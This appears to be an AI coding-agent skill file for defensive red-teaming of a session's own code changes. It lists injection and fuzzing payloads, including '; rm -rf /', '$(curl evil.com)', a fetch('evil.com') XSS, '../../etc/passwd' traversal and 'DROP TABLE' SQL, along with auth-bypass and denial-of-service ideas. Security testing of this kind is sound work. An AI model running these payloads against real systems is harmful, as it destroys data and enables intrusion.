---
name: red-team
description: Adversarial attack simulation — 2 agents try to BREAK your code with malicious inputs, logic attacks, race conditions, auth bypass, and state corruption. Run after implementation to find vulnerabilities before they ship.
---

# Red Team — Adversarial Attack Simulation

You are executing an adversarial red team exercise against the code changes in this session. Your goal is to BREAK the implementation. You are not here to validate — you are here to DESTROY.

## Phase 1: Reconnaissance

First, understand what was changed:
```bash
git diff --name-only HEAD 2>/dev/null || git diff --name-only
```

Read every changed file. Map:
- All new endpoints/routes/API handlers
- All new functions that accept external input
- All new database queries
- All authentication/authorization changes
- All file I/O operations
- All state management changes

## Phase 2: Launch Attack Agents (2 in parallel, model: "opus" — adversarial security work)

### Agent 1 — Input Fuzzing Attack

For EVERY function/endpoint that accepts input, try these attack vectors:

**Injection Attacks:**
- SQL: `' OR '1'='1`, `'; DROP TABLE users;--`, `1 UNION SELECT * FROM secrets`
- XSS: `<script>alert('xss')</script>`, `<img onerror="fetch('evil.com')">`, `javascript:alert(1)`
- Command: `; rm -rf /`, `$(curl evil.com)`, `` `whoami` ``
- Path Traversal: `../../etc/passwd`, `..\\..\\windows\\system32`, `%2e%2e%2f`
- LDAP: `*)(objectClass=*)`, `admin)(password=*`
- Template: `{{7*7}}`, `${7*7}`, `<%= system('id') %>`

**Boundary Attacks:**
- Empty string, null, undefined
- Extremely long strings (10K+ chars)
- Unicode edge cases: zero-width characters, RTL override, homoglyphs
- Negative numbers, MAX_INT, MIN_INT, NaN, Infinity
- Empty arrays, deeply nested objects (100+ levels)
- Files: 0 bytes, 10GB size header, wrong MIME type, polyglot files

**Type Confusion:**
- Send string where number expected
- Send array where object expected
- Send number where boolean expected
- Prototype pollution: `{"__proto__": {"admin": true}}`
- JSON with duplicate keys

For each attack: trace the input through the code. Does it reach a dangerous sink (SQL query, DOM insertion, file system, shell command, eval) without sanitization? If YES — this is a **CRITICAL VULNERABILITY**.

### Agent 2 — Logic & State Attack

**Authentication Bypass:**
- Can you access protected routes without a token?
- Can you use an expired token?
- Can you forge a token (weak secret, algorithm confusion)?
- Can user A access user B's resources by changing IDs?
- Are there admin endpoints without role checks?

**Race Conditions:**
- Can two concurrent requests cause double-spend/double-write?
- Are there check-then-act patterns without locks?
- Can you corrupt shared state with parallel mutations?
- Are database transactions used where needed?

**State Corruption:**
- Can you leave the system in an inconsistent state by failing mid-operation?
- Are there cleanup handlers for partial failures?
- Can you overflow counters, exhaust resources, fill disk?
- What happens if an external service times out mid-transaction?

**Business Logic:**
- Can you bypass payment by manipulating amounts/quantities?
- Can you access features from a wrong lifecycle state?
- Can you replay requests for duplicate effects?
- Are rate limits enforced? Can you bypass them?

**Denial of Service:**
- Can you trigger expensive operations with cheap requests?
- Are there unbounded loops, recursion, or regex (ReDoS)?
- Can you exhaust connection pools, file handles, memory?
- Are there GraphQL/API depth limits?

## Phase 3: Severity Classification

For each vulnerability found:

| Severity | Criteria | Action |
|----------|----------|--------|
| CRITICAL | RCE, SQL injection, auth bypass, data leak | **MUST FIX before presenting work** |
| HIGH | XSS, CSRF, IDOR, race condition with data loss | **MUST FIX before presenting work** |
| MEDIUM | DoS potential, info disclosure, missing rate limit | Fix or document as known risk |
| LOW | Minor hardening, defense-in-depth improvements | Document for backlog |

## Phase 4: Fix & Re-attack

For every CRITICAL and HIGH finding:
1. Implement the fix
2. Re-run the specific attack that found the vulnerability
3. Verify the fix holds
4. Check that the fix didn't introduce new attack surface

## Output Format

```
## Red Team Report

### Attack Surface
- X endpoints/functions tested
- Y attack vectors attempted

### Findings

| # | Severity | Type | Location | Description | Status |
|---|----------|------|----------|-------------|--------|
| 1 | CRITICAL | SQLi | api/users.ts:45 | User input concatenated into SQL query | FIXED |
| 2 | HIGH | XSS | components/Comment.tsx:12 | dangerouslySetInnerHTML with user data | FIXED |

### Summary
- Critical: X found, X fixed
- High: X found, X fixed
- Medium: X found (documented)
- Low: X found (backlog)

**Overall: SECURE / VULNERABLE**
```

If any CRITICAL or HIGH issue remains unfixed: **VULNERABLE** — do NOT present work as complete.
